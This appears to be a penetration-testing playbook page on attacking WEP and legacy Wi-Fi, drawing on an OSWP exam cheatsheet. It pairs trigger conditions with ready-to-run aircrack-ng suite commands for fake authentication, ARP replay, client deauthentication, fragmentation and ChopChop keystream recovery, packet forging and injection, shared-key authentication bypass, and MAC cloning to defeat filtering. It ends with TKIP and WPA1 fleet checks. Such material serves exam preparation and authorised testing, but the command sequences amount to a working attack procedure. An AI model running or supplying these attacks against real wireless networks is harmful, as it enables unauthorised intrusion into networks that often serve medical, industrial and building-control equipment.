# Wireless - WEP and legacy encryption

## Why WEP still turns up, and the shape of every attack against it

**Trigger:** The survey shows `WEP` in the ENC column on a corporate site.

WEP is broken beyond repair and yet still appears in production, almost always attached to equipment that cannot be upgraded: medical devices, warehouse barcode scanners, industrial controllers, building management systems and older networked printers. It is worth knowing properly because when it appears it is an immediate full compromise of that network, and because the equipment behind it is usually the most sensitive thing on the site. Every WEP attack has the same shape: the 24-bit initialisation vector is transmitted in clear and repeats quickly, so key recovery is purely a volume problem — harvest enough IVs and the statistical FMS/PTW attacks recover the key regardless of its length or complexity. That means the entire craft is in generating traffic. If a client is associated, replay its ARP requests. If there is no client, manufacture traffic yourself by recovering a keystream and forging a packet with it. If the AP uses shared-key authentication, harvest a keystream from a legitimate association first. Run `aircrack-ng` against the growing capture concurrently rather than waiting for a target IV count; it will succeed the moment it has enough.

```text
  Clients associated        -> fake auth + ARP replay
  No clients                -> fragmentation or ChopChop -> packetforge -> inject
  AUTH = SKA                -> deauth to harvest a keystream, then fake auth with it
  Any of the above          -> aircrack-ng against the capture, running concurrently

Also legacy and reportable when seen:
  WPA1 / TKIP               -> deprecated cipher; check the CIPHER column
  Open with WEP-like portal -> open-and-guest-networks.md
```

Source: offsecexams.com OSWP cheatsheet

## Fake authentication plus ARP replay

**Trigger:** `ENC=WEP`, at least one client associated, and `#Data` is climbing at only a few frames per second.

You cannot inject into the network until the access point believes you are a station, so associate first with a fake authentication using your own or a spoofed MAC. If that association is refused, do not retry blindly — refusal on WEP almost always means either MAC filtering or shared-key authentication, and those need different responses. Once associated, replay a captured ARP request in a loop. ARP is the frame of choice because it is short, constantly re-broadcast, and every replay forces the access point to emit a fresh IV, which is exactly the resource you need. If no ARP is available the `#Data` counter sits still; deauthenticating a client briefly makes it re-ARP on reconnect and seeds the engine. Run the crack concurrently against the growing capture, and if it stalls near the end, raise the fudge factor to widen the key search rather than collecting more IVs — the fudge factor trades CPU for IVs and is usually the faster of the two.

```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon -w wepcap

sudo aireplay-ng -1 0 -e "LegacySSID" -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon
sudo aireplay-ng -0 1 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon   # seed an ARP

aircrack-ng wepcap*.cap
aircrack-ng -f 4 wepcap*.cap        # raise the fudge factor when it stalls
```

Source: offsecexams.com OSWP cheatsheet

## Clientless keystream recovery: fragmentation and ChopChop

**Trigger:** `ENC=WEP` but the station list is empty, so there is no traffic to replay and `#Data` never moves.

With no client there is nothing to capture and replay, so you manufacture the traffic: recover a keystream from the access point, forge your own ARP packet with it, and inject that to start the IV engine. Fragmentation is the fast path — it exploits the AP's willingness to reassemble and re-emit fragments to extract a long keystream in seconds — but it needs a cooperative AP and fails outright against some. ChopChop is the slower fallback that strips one byte at a time off a captured frame, observing whether the AP accepts each guess; it works where fragmentation fails but takes minutes and is noisy on the air. Either way the output is a `.xor` keystream file, which is not itself the key: feed it to `packetforge-ng` with broadcast source and destination to build a valid encrypted ARP request, then inject that forged packet in a loop. From there it is the same volume problem as the client-present case. Both attacks require a successful fake authentication first, so if they refuse outright, re-check the association before blaming the attack.

```bash
# Fragmentation — fast path
sudo aireplay-ng -5 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon    # -> fragment-*.xor

# ChopChop — slower fallback, byte at a time
sudo aireplay-ng -4 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon    # -> replay_dec-*.xor

# Forge an ARP from the keystream, then inject it in a loop
packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 \
  -k 255.255.255.255 -l 255.255.255.255 -y fragment-0123-456789.xor -w arp-packet
sudo aireplay-ng -2 -r arp-packet wlan0mon

aircrack-ng wepcap*.cap
```

Source: offsecexams.com OSWP cheatsheet

## Shared-key authentication bypass with a harvested XOR

**Trigger:** `AUTH` reads `SKA`, or fake authentication against a WEP network keeps failing even though your MAC is not filtered.

Shared-key authentication has the access point challenge the station with plaintext and expect the WEP-encrypted response, which means a single observed legitimate association leaks a plaintext/ciphertext pair — a usable keystream — for free. Rather than wait for a client to authenticate on its own, deauthenticate an associated client and capture the full four-frame exchange as it reconnects; `airodump-ng` writes the recovered keystream out as a `.xor` file automatically. Feed that keystream back into fake authentication so you can answer the AP's challenge correctly and associate without knowing the key. Once associated, the network is an ordinary WEP target again and you proceed straight to ARP replay for IVs. The diagnostic value matters as much as the attack: repeated fake-authentication failure on WEP is nearly always shared-key authentication or MAC filtering, and this distinguishes them — if the keystream route associates successfully, it was shared key; if it still fails, it is MAC filtering and you need to clone an observed client instead.

```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon -w wepshared
sudo aireplay-ng -0 1 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
#   airodump writes e.g. wepshared-AA-BB-CC-DD-EE-FF.xor

sudo aireplay-ng -1 60 -e "LegacySSID" -y wepshared-AA-BB-CC-DD-EE-FF.xor \
  -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon
```

Source: offsecexams.com OSWP cheatsheet

## MAC filtering bypass

**Trigger:** Association is refused, shared-key authentication is not in use, and the AP appears to accept only certain stations.

MAC filtering is an access-control list of permitted station addresses, and because those addresses travel unencrypted in every frame, the list is readable from the air — the control provides no security against anyone with a monitor-mode card. Observe the associated stations, then clone one. The important detail is which one: cloning a client that is currently online causes an address collision that disrupts both of you and often gets both dropped, so pick a station you have seen associated earlier but which is not currently transmitting. Bring the interface down before the change and up afterwards, because most drivers refuse a MAC change on a live interface. Note that MAC filtering also frequently appears alongside a captive portal on guest networks as the session-tracking mechanism, where the same weakness allows a portal bypass rather than an association bypass.

```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon    # read the STATION list

sudo ip link set wlan0 down
sudo macchanger -m AA:BB:CC:11:22:33 wlan0      # clone a seen-but-idle station
sudo ip link set wlan0 up

macchanger -s wlan0                              # confirm
sudo macchanger -p wlan0                         # restore the permanent address
```

Source: offsecexams.com OSWP cheatsheet

## TKIP and other deprecated configurations worth catching

**Trigger:** The CIPHER column shows `TKIP`, or the survey shows WPA1 rather than WPA2.

TKIP was the transitional cipher between WEP and CCMP and it carries real weaknesses — the Beck-Tews class of attacks allows an attacker to decrypt short packets such as ARP and inject a limited number of forged frames without recovering the key, and TKIP's use of RC4 and its Michael integrity check are both well below current standards. Practically, in a modern engagement TKIP matters less as an attack path than as a marker: an access point still offering it is running an old configuration or old firmware, which usually means the same AP has other things wrong with it, so a TKIP sighting should redirect you to check WPS, PMF and the management interface on that specific device. The same reasoning applies to WPA1, to APs offering `TKIP CCMP` as a mixed cipher suite for backwards compatibility, and to any AP whose beacon indicates a firmware generation noticeably older than its siblings. In a fleet advertising one ESSID, the AP with the oldest configuration is where the engagement should focus.

```bash
sudo airodump-ng wlan0mon --essid "CorpWiFi"
#   CIPHER = TKIP        deprecated
#   CIPHER = TKIP CCMP   mixed mode for legacy clients
#   ENC    = WPA         WPA1, superseded

# Compare the fleet — the outlier is the target
sudo airodump-ng wlan0mon --essid "CorpWiFi" --wps -w fleet
awk -F', ' 'NR>2 && $1 ~ /:/ {print $1, $6, $7, $8, $9}' fleet-01.csv | sort -u

# An AP with an old cipher usually has other old settings:
#   -> wps-attacks.md            (WPS often enabled on the same device)
#   -> recon-and-survey.md       (PMF usually absent too)
#   -> wireless-infrastructure.md (old firmware on the management interface)
```

Source: Operator practice
